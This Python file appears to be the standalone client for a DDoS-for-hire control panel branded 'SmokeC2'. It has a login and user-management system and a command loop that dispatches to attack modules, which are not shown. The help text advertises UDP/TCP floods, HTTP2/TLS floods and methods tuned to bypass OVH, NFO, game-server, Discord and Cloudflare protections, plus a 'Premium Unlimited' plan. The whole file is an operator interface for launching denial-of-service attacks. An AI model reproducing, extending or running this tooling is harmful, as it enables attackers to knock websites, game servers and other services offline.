#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Commands - Attack modules from src/Commands/
from Commands.url_to_ip import url_to_ip
from Commands.ip_to_loc import ip_to_loc

# Layer 4
from Commands.game import game
from Commands.tcp import tcp
from Commands.udp import udp
from Commands.ovh import ovh
from Commands.nfo import nfo
from Commands.hold import hold
from Commands.crash import crash
from Commands.udpbypass import udpbypass

# Layer 7
from Commands.browser import browser
from Commands.cf import cf
from Commands.tlsv2 import tlsv2
from Commands.tls import tls
from Commands.mix import mix
from Commands.bypass import bypass

# Imports
import socket, threading, time, sys, random, ipaddress, json, os, getpass
from colorama import Fore, init, just_fix_windows_console

# Initialize colorama for Windows compatibility
init(autoreset=True)
just_fix_windows_console()

# ------------------------------------------------------------------
# COLOR UTILITY (identical to original)
# ------------------------------------------------------------------
def color(data_input_output):
    colors = {
        "GREEN": '\033[32m',
        "LIGHTGREEN_EX": '\033[92m',
        "YELLOW": '\033[33m',
        "LIGHTYELLOW_EX": '\033[93m',
        "CYAN": '\033[36m',
        "LIGHTCYAN_EX": '\033[96m',
        "BLUE": '\033[34m',
        "LIGHTBLUE_EX": '\033[94m',
        "MAGENTA": '\033[35m',
        "LIGHTMAGENTA_EX": '\033[95m',
        "RED": '\033[31m',
        "LIGHTRED_EX": '\033[91m',
        "BLACK": '\033[30m',
        "LIGHTBLACK_EX": '\033[90m',
        "WHITE": '\033[37m',
        "LIGHTWHITE_EX": '\033[97m'
    }
    return colors.get(data_input_output, '\033[97m')

lightwhite = color("LIGHTWHITE_EX")
gray = color("LIGHTBLACK_EX")
red = color("RED")
lightred = color("LIGHTRED_EX")
cyan = color("CYAN")
yellow = color("LIGHTYELLOW_EX")
green = color("GREEN")

# ------------------------------------------------------------------
# BANNER & HELP TEXT (original style)
# ------------------------------------------------------------------
banner = f"""{red}
\033[97mUptime: \033[94m97% \033[97m| Channel: \033[94m@smokec2 \033[97m| Servers: \033[94m29
     
_._     _,-'""`-._
(,-.`._,'(       |\`-/|
    `-.-' \ )-`( , o o)
          `-    \`_`"'"-

\033[97mWrite \033[91;1mhelp \033[97mto see command
"""

rules = f"""                {lightwhite}1. {gray}Do not attack .gov/.gob/.edu/.mil domains  
{lightwhite}2. {gray}Do not spam attacks"""

help_text = f"""

{lightwhite}HELP         {red}: {lightwhite}Shows list of commands
{lightwhite}METHODS      {red}: {lightwhite}Shows list of methods
{lightwhite}SERVERS      {red}: {lightwhite}Shows servers
{lightwhite}PLAN         {red}: {lightwhite}Show your plan
{lightwhite}ONGOING      {red}: {lightwhite}Shows current attacks
{lightwhite}RECENT       {red}: {lightwhite}Shows your last attacks
{lightwhite}CLEAR        {red}: {lightwhite}Clears the screen
{lightwhite}EXIT         {red}: {lightwhite}Disconnects from the net

{lightwhite}Admin Commands (root only):
{lightwhite}!user        {red}: {lightwhite}Add/remove users
"""

methods_text = f"""
{lightwhite}Layer 4{red}:
{red}- {lightwhite}!udp{red}       {lightwhite}UDP flood
{red}- {lightwhite}!tcp{red}       {lightwhite}TCP flood
{red}- {lightwhite}!pps{red}       {lightwhite}UDP flood make many PPS
{red}- {lightwhite}!ack{red}       {lightwhite}TCP ACK flood
{red}- {lightwhite}!stomp{red}     {lightwhite}TCP handshake + ACK/PSH flood
{red}- {lightwhite}!socket{red}    {lightwhite}TCP socket flood with lots of options
{red}- {lightwhite}!nfo{red}       {lightwhite}TCP flood optimized for bypass NFO
{red}- {lightwhite}!tcpbypass{red} {lightwhite}Simple tcp flood to bypass any protections
{red}- {lightwhite}!ovh{red}       {lightwhite}UDP/TCP flood optimized for bypass OVH
{red}- {lightwhite}!discord{red}   {lightwhite}UDP flood optimized for bypass discord voice
{red}- {lightwhite}!game{red}      {lightwhite}UDP PPS flood optimized for bypass any game servers
{lightwhite}Layer 7{red}:
{red}- {lightwhite}!tls{red}       {lightwhite}HTTP1.2 flood make many RPS
{red}- {lightwhite}!tlsv2{red}     {lightwhite}HTTP2 flood make many RPS optimized for bypass http-ddos
{red}- {lightwhite}!bypass{red}    {lightwhite}HTTP2 flood optimized for bypass any protections, ratelimit
{red}- {lightwhite}!http{red}      {lightwhite}HTTP RAW flood make many RPS
{red}- {lightwhite}!browser{red}   {lightwhite}Browser method for bypassing various types of captchas/cloudflare
{red}- {lightwhite}!crash{red}     {lightwhite}Crash attack via external APIs
{red}- {lightwhite}!cf{red}        {lightwhite}Cloudflare bypass
{red}- {lightwhite}!mix{red}       {lightwhite}Mixed attack
"""

admin_methods = f"""{lightwhite}!user               {gray}Add/remove users"""

# ------------------------------------------------------------------
# LOGIN SYSTEM (uses logins.txt in src directory, no CAPTCHA)
# ------------------------------------------------------------------
def find_login(username, password):
    """Read credentials from logins.txt and validate."""
    login_path = "logins.txt"  # Since we're in the src directory
    try:
        with open(login_path, 'r') as f:
            credentials = [x.strip() for x in f.readlines() if x.strip()]
        for x in credentials:
            if ':' not in x:
                continue
            c_username, c_password = x.split(':', 1)
            if c_username.lower() == username.lower() and c_password == password:
                return True
        return False
    except FileNotFoundError:
        print(f"{red}Error: logins.txt not found in current directory!")
        print(f"{gray}Please create logins.txt with format: username:password")
        return False
    except Exception as e:
        print(f"{red}Error reading logins.txt: {str(e)}")
        return False

def get_first_username():
    """Read the first username from logins.txt for display purposes."""
    try:
        with open("logins.txt", "r") as f:
            lines = f.readlines()
        for line in lines:
            if line.strip() and ':' in line:
                return line.split(':', 1)[0].strip()
        return "user"
    except:
        return "user"

# ------------------------------------------------------------------
# VALIDATION FUNCTIONS (identical to original)
# ------------------------------------------------------------------
def validate_ip(ip):
    try:
        parts = ip.split('.')
        if len(parts) != 4:
            return False
        for part in parts:
            if not part.isdigit():
                return False
            val = int(part)
            if val < 0 or val > 255:
                return False
        return not ipaddress.ip_address(ip).is_private
    except:
        return False

def validate_port(port, rand=False):
    if not port.isdigit():
        return False
    val = int(port)
    if rand:
        return 0 <= val <= 65535
    return 1 <= val <= 65535

def validate_time(time_str):
    if not time_str.isdigit():
        return False
    val = int(time_str)
    return 10 <= val <= 86400

def validate_size(size):
    if not size.isdigit():
        return False
    val = int(size)
    return 1 < val <= 65500

# ------------------------------------------------------------------
# LOCAL OUTPUT FUNCTIONS (replaces socket send)
# ------------------------------------------------------------------
def local_print(data, newline=True):
    """Print to stdout with ANSI colors preserved."""
    if newline:
        print(data + Fore.RESET)
    else:
        print(data + Fore.RESET, end='', flush=True)

# ------------------------------------------------------------------
# DUMMY SEND/CLIENT FUNCTIONS (to satisfy attack module signatures)
# ------------------------------------------------------------------
class DummyClient:
    """Mock client object that prints to stdout instead of sending over socket."""
    def close(self):
        pass
    def recv(self, size):
        return b''

dummy_client = DummyClient()

def dummy_send(socket_obj, data, escape=True, reset=True):
    """Replacement for socket.send() that prints to console."""
    if reset:
        data += Fore.RESET
    if escape:
        data += '\r\n'
    print(data, end='', flush=True)

def dummy_broadcast(data):
    """Replacement for broadcast() that just logs to console."""
    # The '32' is appended just like in the original broadcast
    print(f"{gray}[BROADCAST] {lightwhite}{data} 32")

def dummy_validate_time(time_str):
    """Wrapper for validate_time that returns boolean."""
    return validate_time(time_str)

# ------------------------------------------------------------------
# USER MANAGEMENT (admin command - works on local logins.txt)
# ------------------------------------------------------------------
def user_management(args):
    """Add or remove users from logins.txt (admin only)."""
    try:
        if len(args) < 2:
            print(f"{red}Usage: !user ADD <username> <password>  or  !user REMOVE <username>")
            return
        
        choice = args[1].upper()
        
        if choice == 'ADD':
            if len(args) != 4:
                print(f"{red}Usage: !user ADD <username> <password>")
                return
            username = args[2]
            password = args[3]
            
            # Check if user already exists
            try:
                with open('logins.txt', 'r') as f:
                    lines = f.readlines()
                for line in lines:
                    if line.strip() and ':' in line:
                        existing_user = line.split(':', 1)[0]
                        if existing_user == username:
                            print(f"{red}User '{username}' already exists!")
                            return
            except:
                pass
            
            # Append new user
            with open('logins.txt', 'a') as f:
                f.write(f'\n{username}:{password}')
            print(f"{green}Added user '{username}' successfully!")
            
        elif choice == 'REMOVE':
            if len(args) != 3:
                print(f"{red}Usage: !user REMOVE <username>")
                return
            username = args[2]
            
            try:
                with open('logins.txt', 'r') as f:
                    lines = f.readlines()
                
                new_lines = []
                removed = False
                for line in lines:
                    if line.strip() and ':' in line:
                        if line.split(':', 1)[0] != username:
                            new_lines.append(line)
                        else:
                            removed = True
                    else:
                        new_lines.append(line)
                
                with open('logins.txt', 'w') as f:
                    f.writelines(new_lines)
                
                if removed:
                    print(f"{green}Removed user '{username}' successfully!")
                else:
                    print(f"{red}User '{username}' not found!")
            except FileNotFoundError:
                print(f"{red}logins.txt not found!")
        else:
            print(f"{red}Invalid option. Use ADD or REMOVE")
    except Exception as e:
        print(f"{red}Error: {str(e)}")

# ------------------------------------------------------------------
# COMMAND PARSER AND EXECUTOR (with login and admin checks)
# ------------------------------------------------------------------
def execute_command(command_line, username):
    """Parse and execute a single command locally."""
    if not command_line or command_line.strip() == '':
        return True

    args = command_line.strip().split(' ')
    command = args[0].upper()
    
    # ---- HELP ----
    if command == 'HELP':
        print(help_text)
        return True
    
    # ---- METHODS ----
    if command == 'METHODS':
        print(methods_text)
        return True
    
    # ---- SERVERS ----
    if command == 'SERVERS':
        print(f"{lightwhite}Available servers: 36.")
        return True
    
    # ---- PLAN ----
    if command == 'PLAN':
        print(f"{lightwhite}Your plan: {yellow}Premium Unlimited")
        return True
    
    # ---- ONGOING ----
    if command == 'ONGOING':
        print(f"{gray}No ongoing attacks.")
        return True
    
    # ---- RECENT ----
    if command == 'RECENT':
        print(f"{gray}No recent attacks.")
        return True
    
    # ---- CLEAR / CLS ----
    if command in ['CLEAR', 'CLS']:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(banner)
        print(rules)
        return True
    
    # ---- EXIT / LOGOUT ----
    if command in ['EXIT', 'QUIT', 'LOGOUT']:
        print(f"{gray}Disconnected from the net")
        return False
    
    # ---- !ADMIN ----
    if command == '!ADMIN':
        if username == "root":
            print(admin_methods)
        else:
            print(f"{red}You are not authorized to use admin commands.")
        return True
    
    # ---- !USER ----
    if command in ['!USER', '!U']:
        if username == "root":
            user_management(args)
        else:
            print(f"{red}You are not authorized to use admin commands.")
        return True
    
    # ---- UTILITY: URL_TO_IP ----
    if command == '!URL_TO_IP':
        if len(args) >= 2:
            url_to_ip(args, dummy_send, dummy_client, gray)
        else:
            print(f"{red}Usage: !url_to_ip <url>")
        return True
    
    # ---- UTILITY: IP_TO_LOC ----
    if command in ['!IP_TO_LOCAT', '!IP_TO_LOCATION', '!IP_GEO', '!IP_GEOLOCATION', '!IP_GEOLOCAT']:
        if len(args) >= 2:
            ip_to_loc(args, dummy_send, dummy_client, gray)
        else:
            print(f"{red}Usage: !ip_to_loc <ip>")
        return True
    
    # ---- ATTACK: UDP ----
    if command == '!UDP':
        if len(args) >= 4:
            udp(args, dummy_validate_time, dummy_send, dummy_client, '\033[2J\033[H', dummy_broadcast, command_line)
        else:
            print(f"{red}Usage: !udp <target_ip> <port> <duration> <packet_size>")
        return True
    
    # ---- ATTACK: TCP ----
    if command == '!TCP':
        if len(args) >= 4:
            tcp(args, dummy_validate_time, dummy_send, dummy_client, '\033[2J\033[H', dummy_broadcast, command_line)
        else:
            print(f"{red}Usage: !tcp <target_ip> <port> <duration>")
        return True
    
    # ---- ATTACK: GAME ----
    if command == '!GAME':
        if len(args) >= 4:
            game(args, dummy_validate_time, dummy_send, dummy_client, '\033[2J\033[H', dummy_broadcast, command_line)
        else:
            print(f"{red}Usage: !game <target_ip> <port> <duration>")
        return True
    
    # ---- ATTACK: OVH ----
    if command == '!OVH':
        if len(args) >= 4:
            ovh(args, dummy_validate_time, dummy_send, dummy_client, '\033[2J\033[H', dummy_broadcast, command_line)
        else:
            print(f"{red}Usage: !ovh <target_ip> <port> <duration>")
        return True
    
    # ---- ATTACK: NFO ----
    if command == '!NFO':
        if len(args) >= 4:
            nfo(args, dummy_validate_time, dummy_send, dummy_client, '\033[2J\033[H', dummy_broadcast, command_line)
        else:
            print(f"{red}Usage: !nfo <target_ip> <port> <duration>")
        return True
    
    # ---- ATTACK: HOLD ----
    if command == '!HOLD':
        if len(args) >= 4:
            hold(args, dummy_validate_time, dummy_send, dummy_client, '\033[2J\033[H', dummy_broadcast, command_line)
        else:
            print(f"{red}Usage: !hold <target_ip> <port> <duration>")
        return True
    
    # ---- ATTACK: CRASH ----
    if command == '!CRASH':
        if len(args) >= 4:
            crash(args, dummy_validate_time, dummy_send, dummy_client, '\033[2J\033[H', dummy_broadcast, command_line)
        else:
            print(f"{red}Usage: !crash <target_ip> <port> <duration>")
        return True
    
    # ---- ATTACK: UDPBYPASS ----
    if command == '!UDPBYPASS':
        if len(args) >= 4:
            udpbypass(args, dummy_validate_time, dummy_send, dummy_client, '\033[2J\033[H', dummy_broadcast, command_line)
        else:
            print(f"{red}Usage: !udpbypass <target_ip> <port> <duration>")
        return True
    
    # ---- ATTACK: BROWSER ----
    if command == '!BROWSER':
        if len(args) >= 4:
            browser(args, dummy_validate_time, dummy_send, dummy_client, '\033[2J\033[H', dummy_broadcast, command_line)
        else:
            print(f"{red}Usage: !browser <target_ip> <port> <duration>")
        return True
    
    # ---- ATTACK: CF ----
    if command == '!CF':
        if len(args) >= 4:
            cf(args, dummy_validate_time, dummy_send, dummy_client, '\033[2J\033[H', dummy_broadcast, command_line)
        else:
            print(f"{red}Usage: !cf <target_ip> <port> <duration>")
        return True
    
    # ---- ATTACK: TLSV2 ----
    if command == '!TLSV2':
        if len(args) >= 5:
            tlsv2(args, dummy_validate_time, dummy_send, dummy_client, '\033[2J\033[H', dummy_broadcast, command_line)
        else:
            print(f"{red}Usage: !tlsv2 <target_ip> <port> <duration> <threads>")
        return True
    
    # ---- ATTACK: TLS ----
    if command == '!TLS':
        if len(args) >= 5:
            tls(args, dummy_validate_time, dummy_send, dummy_client, '\033[2J\033[H', dummy_broadcast, command_line)
        else:
            print(f"{red}Usage: !tls <target_ip> <port> <duration> <threads>")
        return True
    
    # ---- ATTACK: MIX ----
    if command == '!MIX':
        if len(args) >= 4:
            mix(args, dummy_validate_time, dummy_send, dummy_client, '\033[2J\033[H', dummy_broadcast, command_line)
        else:
            print(f"{red}Usage: !mix <target_ip> <port> <duration>")
        return True
    
    # ---- ATTACK: BYPASS ----
    if command == '!BYPASS':
        if len(args) >= 5:
            bypass(args, dummy_validate_time, dummy_send, dummy_client, '\033[2J\033[H', dummy_broadcast, command_line)
        else:
            print(f"{red}Usage: !bypass <target_ip> <port> <duration> <threads>")
        return True
    
    # ---- UNKNOWN COMMAND ----
    print(f"{red}Unknown command: {command}")
    print(f"{gray}Type 'help' for available commands")
    return True

# ------------------------------------------------------------------
# LOGIN SCREEN (no CAPTCHA, uses logins.txt)
# ------------------------------------------------------------------
def login():
    """Display login prompt and authenticate user (no CAPTCHA)."""
    print(f"{cyan}┌─────────────────────────────────────────────────┐")
    print(f"{cyan}│  SmokeC2 Standalone Client                    │")
    print(f"{cyan}│  No CAPTCHA - Uses logins.txt                │")
    print(f"{cyan}│  Commands from: Commands/ directory          │")
    print(f"{cyan}└─────────────────────────────────────────────────┘")
    print()
    
    attempts = 0
    max_attempts = 3
    
    while attempts < max_attempts:
        try:
            username = input(f"{lightwhite}Username : ").strip()
            if not username:
                continue
            
            # Hide password input
            password = getpass.getpass(f"{gray}Password : ")
            
            if find_login(username, password):
                print(f"{green}Login successful!")
                return username
            else:
                attempts += 1
                remaining = max_attempts - attempts
                print(f"{red}Invalid credentials! {remaining} attempts remaining.")
                
        except KeyboardInterrupt:
            print(f"\n{gray}Login cancelled.")
            return None
        except Exception as e:
            print(f"{red}Error during login: {str(e)}")
            attempts += 1
    
    print(f"{red}Maximum login attempts exceeded.")
    return None

# ------------------------------------------------------------------
# MAIN INTERACTIVE LOOP
# ------------------------------------------------------------------
def main():
    # Clear screen and show banner
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Show login screen (no CAPTCHA)
    username = login()
    if username is None:
        print(f"{gray}Exiting.")
        sys.exit(0)
    
    # Display banner and rules
    print(banner)
    print(rules)
    print()
    
    # Prompt style (matches original)
    prompt = f"\x1b[37;47m\x1b[97msmoke\x1b[91;1m ✦ \x1b[97m{username}\x1b[0m\x1b[91m ➤ {yellow}"
    
    # Main command loop
    running = True
    while running:
        try:
            # Get user input with custom prompt
            cmd = input(prompt).strip()
            if not cmd:
                continue
            
            # Execute command
            running = execute_command(cmd, username)
            
        except KeyboardInterrupt:
            print(f"\n{gray}Disconnected from the net")
            break
        except EOFError:
            print(f"\n{gray}Disconnected from the net")
            break
        except Exception as e:
            print(f"{red}Error: {str(e)}")
            continue
    
    print(f"{gray}Goodbye.")

# ------------------------------------------------------------------
# ENTRY POINT
# ------------------------------------------------------------------
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{gray}Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"{red}Fatal error: {str(e)}")
        sys.exit(1)
